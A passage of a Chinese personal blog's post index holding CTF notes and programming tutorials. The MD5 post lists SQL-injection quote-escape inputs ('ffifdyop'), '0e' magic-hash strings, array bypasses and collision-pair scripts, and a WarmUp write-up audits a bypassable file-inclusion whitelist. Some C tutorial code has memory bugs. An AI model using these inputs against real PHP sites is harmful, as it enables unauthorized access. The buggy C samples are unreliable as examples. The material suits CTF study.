softmax函数$$y_k=\\frac{e^}{\\sum_{i=1}^ne^{a_i}}$$","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"有关md5的一些信息","slug":"something_about_md5","date":"2021-11-23T15:56:14.073Z","updated":"2021-11-23T16:35:02.663Z","comments":true,"path":"2021/11/23/something_about_md5/","link":"","permalink":"http://uniqueland.top/2021/11/23/something_about_md5/","excerpt":"在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种","text":"在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种 在sql注入中 若遇到了类似以下的情况 123$password=$_POST[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($link,$sql); 可以传入ffifdyop或者129581926211651571912466741651878684928，这两者md5加密后的结果都包含 ‘ OR ‘ 的字样，可用于引号逃逸 在弱类型比较中 若存在对两个md5加密后的字符串进行比较时，可传入类似s1502113478a、s1836677006a的字符串，加密后都是以0e开头，比较时都为零 123456789&lt;?php$a = &quot;s1502113478a&quot;;$b = &quot;s1836677006a&quot;;$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234┌──(kali㉿kali)-[~/Documents]└─$ php md5.php 0e8615801632915612474043813960640e481036490867661113260034900752 在允许传递数组时 可以传入两个空数组，由于md5无法对数组进行加密，故返回null，而 null = null 为 true 123456789&lt;?php$a = array();$b = array();$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234┌──(kali㉿kali)-[~/Documents]└─$ php em_array.php PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 5PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 6 虽然转换失败，但是返回了 null ，需要注意的是，在传递数组时应使用如下形式： 1a[]=1 &amp; b[1]=&quot;b&quot; &amp; c[] md5碰撞 当上述方法都不奏效时：可以使用md5算法本身的漏洞；md5碰撞指的是不同的输入进行md5加密后得到同样的输出，网上有许多算法可以实现，需要注意的是，由于输入需上传服务器，故需要对输出进行url编码 12345678910111213141516171819202122232425262728293031323334353637383940414243#!coding:utf-8hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;hexList1 = []intList1 = []asciiString1 =&#x27;&#x27;while True: intString1 = hexString1[0:2] hexString1 = hexString1[2:] hexList1.append(intString1) if (hexString1 == &#x27;&#x27;): breakfor i in hexList1: intList1.append(int(i,16))for j in intList1: asciiString1 += chr(int(j))f = open(&#x27;1.bin&#x27;,&#x27;w&#x27;)f.write(asciiString1)f.close()hexList2 = []intList2 = []asciiString2 =&#x27;&#x27;while True: intString2 = hexString2[0:2] hexString2 = hexString2[2:] hexList2.append(intString2) if (hexString2 == &#x27;&#x27;): breakfor i in hexList2: intList2.append(int(i,16))for j in intList2: asciiString2 += chr(int(j))f = open(&#x27;2.bin&#x27;,&#x27;w&#x27;)f.write(asciiString2)f.close() 1234567891011121314#!coding:utf-8import urllib.requesturlString1=&#x27;&#x27;urlString2 = &#x27;&#x27;for line in open(&#x27;1.bin&#x27;): urlString1 += urllib.parse.quote(line)for line in open(&#x27;2.bin&#x27;): urlString2 += urllib.parse.quote(line)print(urlString1)print(urlString2)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"}]},{"title":"HCTF 2018WarmUp 1","slug":"[HCTF 2018]WarmUp 1","date":"2021-11-07T15:15:57.237Z","updated":"2021-11-07T15:57:44.286Z","comments":true,"path":"2021/11/07/[HCTF 2018]WarmUp 1/","link":"","permalink":"http://uniqueland.top/2021/11/07/[HCTF%202018]WarmUp%201/","excerpt":"一上来便是一张天真无邪的笑脸","text":"一上来便是一张天真无邪的笑脸无头绪，f12查源码，发现source.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 开始代码审计 网页通过对传入的参数进行过滤后进行文件包含 一开始我以为是需要满足所有的条件，但根据下文包含文件的代码发现只需要满足其中一个就足够了 123456789if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; 在尝试了许久之后我发现重点在于最后一个判断，即从解码函数开始的判断；在解码之后出现了新的变量$_page，然后对该变量进行分割，取出变量中问号之前的部分，覆盖原来的变量，再判断该变量是否位于白名单内。 1234567$_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; 判断通过后对文件进行包含，这时遍历文件目录就能找到flag了，文件名称在hint.php里 最终payload：","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"使用C语言实现栈","slug":"stack_by_C","date":"2021-09-05T14:17:42.819Z","updated":"2021-09-05T15:09:46.818Z","comments":true,"path":"2021/09/05/stack_by_C/","link":"","permalink":"http://uniqueland.top/2021/09/05/stack_by_C/","excerpt":"说明 作为栈顶的节点不存储数据","text":"说明 作为栈顶的节点不存储数据，仅作定位功能 数据项的类型可自行定义 在push和pop时，并不改变栈顶节点的位置，仅仅是将待操作节点加入或删除并改变指针指向而已 栈顶节点的数据项可用来存储当前栈的节点数，这点在push函数的定义中可以体现 主函数仅作各函数的演示使用，可自定义 定义相应结构 1234typedef struct node&#123; int data; struct node *next;&#125;node; 该结构由一个整型和一个指向此结构的指针组成。 定义push函数 123456789int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; top-&gt;data++; return data;&#125; 第一步：分配空间 第二步：存储数据 第三步：改变栈顶和新增项的next指针，递增top节点的data项 定义pop函数 12345678910111213int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125; 第一步：判断栈是否为空 第二步：定义变量存储待弹出的数据和待删除节点 第三步：改变栈顶的next指针 释放待删除节点空间，删除节点 定义初始化函数 为栈顶节点分配空间并初始化指针为空 1234567node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125; 定义遍历显示函数 1234567void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125; 将当前节点指向栈顶的下一个节点 当前节点不为空时进入遍历循环 打印当前节点的数据项 将当前节点指向下一个节点 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; int data; struct node *next;&#125;node;int push(node *top, int data);int pop(node *top);node* stack_init();void display(node *current);int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; return data;&#125;int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125;node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125;void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125;int main()&#123; int first_input; int pop_input, pop_data; node *top = stack_init(); int status; printf(&quot;Enter strings, Ctrl+Z to quit.\\n&quot;); status = scanf(&quot;%d&quot;,&amp;first_input); while(status!=EOF)&#123; push(top, first_input); status = scanf(&quot;%d&quot;,&amp;first_input); &#125; display(top); printf(&quot;Now enter 1 to pop data, 0 to quit.\\n&quot;); scanf(&quot;%d&quot;,&amp;pop_input); while(pop_input==1)&#123; pop_data = pop(top); if(pop_data==-1)&#123; break; &#125; printf(&quot;pop_data: %d\\n&quot;,pop_data); scanf(&quot;%d&quot;,&amp;pop_input); &#125; printf(&quot;\\nDone\\n&quot;); return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"使用C语言实现链表","slug":"link_list_by_C","date":"2021-05-02T06:13:00.666Z","updated":"2021-09-05T14:19:04.270Z","comments":true,"path":"2021/05/02/link_list_by_C/","link":"","permalink":"http://uniqueland.top/2021/05/02/link_list_by_C/","excerpt":"","text":"第一步：定义相应结构 由于实现链表的编程语言为C，不能够使用类，故使用结构来实现链表中的节点； 12345typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link; 该结构由一个字符数组，一项编号和一个指向此结构的指针组成。 第二步：定义输入函数 为了更容易、更准确的获取输入，在程序中重新定义输入函数，在原有fgets()函数的基础上略作修改，得到新的输入函数s_gets()； 1234567891011121314151617char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125; 该函数为返回类型为字符指针、接受参数为一个字符指针和一个整数的输入函数，其中字符指针就是字符数组名称，因为数组名称本质上就是数组首元素的地址，而该数组为字符数组，故该字符数组名称本质上就是字符指针； 在函数内部，我声明了两个字符指针，一个用来接受fgets函数的返回值，一个用来接受查找字符函数(strchr)的返回值； 关于fgets()函数： 如果接受输入的字符数量超过字符数组的大小(MAX_INPUT)，fgets()函数会返回先前传入的地址，即字符数组的名称，并且把末尾的字符换为空字符('\\0')，使之成为一个字符串； 如果接收输入的字符数量在字符数组的大小以内，那么fgets()函数会将空字符放置在换行符之前，然后同样返回先前传入的地址； 需要注意的是：fgets()函数在遇到文件结尾(EOF End Of File)时将会返回一个空指针； 关于strchr()函数： 在某个字符数组中查找某字符，并返回指向该字符的指针 r如果字符串中不包含该字符，则返回一个空指针 经过重写，修改如下： 首先使用fgets()函数接收输入，并将返回值存储在指针ret_val中，然后对该指针进行判断，如果不为空指针，则使用字符查找函数查找换行符，并将该换行符替换为空字符，如果查找换行符失败，说明输入的字符数量超过了字符数组的大小，这时使用一个while循环接收其余的输入并抛弃；如果ret_val为空指针，说明遇到文件结尾；最后返回ret_val； 第三步：编写主函数进行测试 12345678910111213141516171819202122232425int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125; 首先声明一个字符数组用来储存输入，然后声明一个节点类型的指针作为头节点，并为其分配内存，接着再声明一个同样的临时指针指向该头指针，这里使用临时指针的目的是作为当前指针与下一个指针的过渡指针，同时保持头指针指向的内容不变，方便最后的输出； 在输出提示信息之后进入循环，退出条件为输入空行；在循环中，首先声明指向当前节点的指针并为其分配内存，接着将该指针指向的结构中的指针声明为NULL，然后将当前节点的指针赋给临时指针指向的结构的指针，使其与上一个节点相连，然后再将临时指针指向的指针赋给自身(其实就相当于使临时指针指向下一个节点)；接着将刚刚接收的输入复制到当前节点的name变量中，然后再接收编号的输入并存储到当前节点的number变量中；值得注意的是，在使用scanf()函数接收输入后该函数似乎会将换行符留在缓存区中，所以这里需要使用getchar()函数来将该换行符从缓存区中去除； 在循环结束之后，我将临时指针指向了头节点的下一个节点(请注意，头节点中并没有储存除下一个节点的地址之外的任何信息，故此处从头节点的下一个节点开始)；然后进入下一个while循环，退出条件为临时指针为空指针(因为在上一个while循环中已经将当前节点中的指针声明为NULL了，所以一旦第一个循环结束，最后一个节点中的指针必为NULL)，然后打印出当前节点的信息并将临时指针指向下一个节点。 源代码 最后附上源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define MAX_INPUT 20char* s_gets(char* st, int n);char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125;typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link;int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"用Python编写一个能将图片转换为字符画的程序","slug":"用Python编写一个能将图片转换为字符画的程序","date":"2021-04-09T16:46:04.299Z","updated":"2020-11-10T02:54:55.042Z","comments":true,"path":"2021/04/10/用Python编写一个能将图片转换为字符画的程序/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081\\# -*- coding=utf-8 -*- from PIL import Image import argparse #命令行输入参数处理 parser = argparse.ArgumentParser() parser.add_argument(&#x27;file&#x27;) #输入文件parser.add_argument(&#x27;-o&#x27;, &#x27;--output&#x27;) #输出文件 parser.add_argument(&#x27;--width&#x27;, type = int, default = 80) #输出字符画宽 parser.add_argument(&#x27;--height&#x27;, type = int, default = 80) #输出字符画高 #获取参数 args = parser.parse_args() IMG = args.fileWIDTH = args.width HEIGHT = args.height OUTPUT = args.output ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\\&quot;^&#x27;. &quot;) # 将256灰度映射到70个字符上 def get_char(r,g,b,alpha = 256): ​ if alpha == 0: ​ return &#x27; &#x27; ​ length = len(ascii_char) ​ gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b) ​ unit = (256.0 + 1)/length ​ return ascii_char[int(gray/unit)] if __name__ == &#x27;__main__&#x27;: ​ im = Image.open(IMG) ​ im = im.resize((WIDTH,HEIGHT), Image.NEAREST) ​ txt = &quot;&quot; ​ for i in range(HEIGHT): ​ for j in range(WIDTH): ​ txt += get_char(*im.getpixel((j,i))) ​ txt += &#x27;\\n&#x27; ​ print(txt) #字符画输出到文件 ​ if OUTPUT: ​ with open(OUTPUT,&#x27;w&#x27;) as f: ​ f.write(txt) ​ else: ​ with open(&quot;output.txt&quot;,&#x27;w&#x27;) as f: ​ f.write(txt)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"人工智能入门-查找","slug":"人工智能入门-搜索","date":"2021-04-09T16:46:04.298Z","updated":"2021-05-02T06:00:22.634Z","comments":true,"path":"2021/04/10/人工智能入门-搜索/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/","excerpt":"概述 众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。","text":"概述 众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。 也许有人会说，导航不就是电子地图嘛？和人工智能有什么关系？但其实在导航中人工智能发挥了很重要的作用。“条条大路通罗马”，为什么导航会向你推荐这条路而不推荐另一条路？这其中就涉及到了人工智能中的搜索算法。 在搜索中，往往有初始状态(initial states)、目标状态(goal states)，而人工智能所做的，就是在众多情形中，找到众多解决方法的最优解，其中会涉及到循环和迭代，假如我们现在有一个初始状态，我们要怎样达到目标状态呢？ 概念介绍 在这之前需要先了解一些概念： 动作：通常是接受状态的函数，返回在此状态中应该做出的决策 迁移模型：通常是接受状态和动作的函数，返回在此状态下做出此种决策后的新状态 节点：数据结构，用来记录状态，父节点，动作和路径成本 边界：数据结构，用来区分已探索的部分和未探索的部分 算法讨论 在了解了相关概念之后，我们开始讨论算法： 首先将初始状态放入边界，然后进入循环 如果边界为空，则无解 从边界中移去一个节点 如果此节点包含目标状态，则追踪父节点，然后返回解决方案 扩张节点并将其加入边界 下面举个例子： 假设我们现在的要求是找到从A到E的路径 第一步我们将A（初始状态）放入边界，进入循环 因为A不是目标状态，将A移出边界并将B加入边界 因为B不是目标状态，将B移出边界并将C和D加入边界 因为C不是目标状态，将C移出边界并将E加入边界 因为E是目标状态，所以我们返回从A到E的路径，循环结束 至此，我们就解决了一个非常简单的路径搜索问题，当然，这个算法还存在着许多问题，比如：如何确保算法不会重新检查当前状态的父节点？如果重复检查父节点，那么程序将进入无限死循环。解决方法很简单，使用一个数据结构来储存已检查过的节点，然后在每次检查节点时遍历此数据结构，如果存在与之相同的节点则不检查。 那么在实际情况下是怎么样的呢？ 实战 下面进入实战环节： 情境：你现在有一张迷宫地图，起点为A，终点为B，需要编写程序令计算机自行找出离开迷宫的路并显示在屏幕上 12345678910111213141516171819# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # 我们将这个待实现的程序按照之前所讨论的分为几个部分： 如图所示，我们主要将程序分为三个部分： 首先是定义相关的变量，并且将初始状态放入边界； 然后进入循环： 第一步：检查边界的长度，如果等于0则说明无解 第二步：从边界中移去一个节点，并将此节点添加到表示已探索的数据结构 第三步：检查被移去的节点，如果此节点包含目标状态，则追踪其父节点，并返回路径 最后，我们使用一个循环来追踪完整的路径，并将其显示在屏幕上。 以下是根据思路实现的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapfor i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = trace for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;) break for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y))) current = frontier[0] travel(map1,start) 在实现的过程中，我遇到了一些问题： 由于对Python中类的使用不熟练，导致代码中有关部分看起来很奇怪 在遍历当前节点周围的有效节点时，没有重新初始化节点，而是直接将当前节点周围有效节点的坐标加入边界，导致循环从第二次开始就无法进行，因为坐标没有“周围的有效节点”这个属性 在将以探索过的节点加入对应数据结构后，检查下一个节点是否在此数据结构时直接使用“==”，但是即使坐标相同的两个节点也可能不相等，原因是这两个节点存在于不同的地址，正确的做法是再遍历一遍存储以探索过的数据结构，直接比较此数据结构中节点的坐标值 在完成初步的实现后，处于对代码重构的要求，对代码做了相关的函数封装： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapdef map_show(map1): for i in map1: for j in i: print(j,end=&#x27; &#x27;) 